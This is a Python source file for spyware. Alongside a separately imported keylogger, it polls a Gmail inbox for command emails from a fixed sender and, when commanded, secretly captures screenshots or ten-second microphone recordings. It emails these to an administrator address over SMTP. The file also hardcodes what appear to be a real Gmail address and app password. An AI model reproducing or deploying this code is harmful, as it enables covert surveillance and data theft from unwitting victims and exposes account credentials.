#microphone capability
from scipy.io.wavfile import write
import sounddevice as sd
#Email_send
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders 
import smtplib
#email_read
import imaplib
import email
#multiple
from threading import Thread
from PIL import ImageGrab


audio_info = "audio.wav"
ss_info = "ss.png"

host = "imap.gmail.com"
email_address = "  " #Enter a Mail Address for Keylogger
password = "  " #Enter Keylogger-Mail Password for Low Level Login
toaddr = "  "  #Enter Admin Mail Address





#log file path
file_path = ".//res"
extend = "//"
file_merge = file_path + extend


def send_email(filename,attachment,toaddr):
    
    fromaddr = email_address

    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] =  "Log File"
    body = "It is Auto Generated Message -- by LOGe \n " 
    msg.attach(MIMEText(body,'plain'))

    filename = filename
    attachment= open(attachment,'rb')

    p = MIMEBase('application','octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)

    p.add_header('Content-Disposition',"attachment; filename= %s"% filename)
    msg.attach(p)
    
    #Smtpsession
    s = smtplib.SMTP('smtp.gmail.com',587)
    s.starttls()
    s.login(fromaddr,password)

    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()

def microphone():
    fs = 44100
    seconds = 10
    try:
        myrecording= sd.rec(int(seconds*fs),samplerate=fs,channels=2)
        sd.wait()
        write(file_path+extend+audio_info,fs,myrecording)
    except Exception:
        return -10
        
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path+extend+ss_info)

def get_inbox():
    mail = imaplib.IMAP4_SSL(host)
    mail.login("mysterious.logger@gmail.com","nqsrgzyrbgmgrflw")
    mail.select('inbox')

    _, searched_data = mail.search(None, 'UNSEEN')

    for searched in searched_data[0].split():
        data_to_return = {}
        _, mail_data = mail.fetch(searched, "(RFC822)")
        _, data = mail_data[0]
        message = email.message_from_bytes(data)
        
        if message['FROM']==str('no name <yalgaarho3@gmail.com>') and message['Subject']==str('ACTION-SM@SS'):
            headers = ["From", "To", "Date", "Subject"]
            for header in headers:
                data_to_return[header] = message[header]

            return 1
        
        if message['FROM']==str('no name <yalgaarho3@gmail.com>') and message['Subject']==str('ACTION-SM@MM'):
            headers = ["From", "To", "Date", "Subject"]
            for header in headers:
                data_to_return[header] = message[header]

            return 2



        
    return -1

def check():
    while 1:
        x = get_inbox()
        print(x)
        if x == 1:
            screenshot()
            send_email(ss_info,file_path+extend+ss_info,toaddr)
        if x == 2:    
            microphone()
            send_email(audio_info,file_path+extend+audio_info,toaddr)

def Temp():
     import keylogger

Thread(target=Temp).start()
Thread(target=check).start()


